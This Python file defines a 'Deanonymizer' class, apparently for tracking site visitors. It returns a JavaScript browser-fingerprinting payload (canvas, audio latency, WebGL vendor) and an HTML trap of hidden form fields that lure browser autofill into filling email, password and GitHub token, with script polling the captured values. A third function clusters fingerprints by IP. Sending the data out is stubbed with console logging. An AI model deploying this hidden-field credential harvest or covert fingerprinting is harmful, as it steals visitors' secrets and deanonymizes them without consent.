import json

class Deanonymizer:
    def __init__(self):
        self.captured_profiles = []

    def get_fingerprint_payload(self):
        """Returns the vanilla JavaScript payload for hardware fingerprinting."""
        js_payload = """
        async function captureFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("NullShadow_v3_Fingerprint", 2, 15);
            const canvasFingerprint = canvas.toDataURL();

            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const analyser = audioCtx.createAnalyser();
            oscillator.connect(analyser);
            const audioLatency = audioCtx.baseLatency;

            const fingerprint = {
                canvas: canvasFingerprint.length,
                audioLatency: audioLatency,
                platform: navigator.platform,
                webglVendor: getWebglVendor()
            };
            
            console.log("Fingerprint Captured:", fingerprint);
            // In a real scenario, this would be sent back to the backend
            return fingerprint;
        }

        function getWebglVendor() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        }
        """
        return js_payload

    def autofill_password_trap(self):
        """Generates invisible HTML fields to trick browser credential savers."""
        html_trap = """
        <form style="display:none;">
            <input type="text" name="email" id="trap_email">
            <input type="password" name="password" id="trap_password">
            <input type="text" name="github_token" id="trap_token">
        </form>
        <script>
            // Capture variables instantly via JS if autofilled
            setInterval(() => {
                const email = document.getElementById('trap_email').value;
                const pass = document.getElementById('trap_password').value;
                if(email || pass) {
                    console.log("Autofill Intercepted:", {email, pass});
                }
            }, 1000);
        </script>
        """
        return html_trap

    def context_clustering_backend(self, profiles):
        """Clusters browser signatures to identify coordinated attacks."""
        print("[*] Running Context Clustering Backend...")
        # Simple string matching simulation for clustering
        clusters = {}
        for p in profiles:
            sig = f"{p.get('platform')}_{p.get('webglVendor')}"
            if sig not in clusters:
                clusters[sig] = []
            clusters[sig].append(p.get('ip'))
        
        for sig, ips in clusters.items():
            if len(set(ips)) > 1:
                print(f"[!] Coordinated Attack Detected! Signature: {sig} from IPs: {ips}")
        
        return clusters
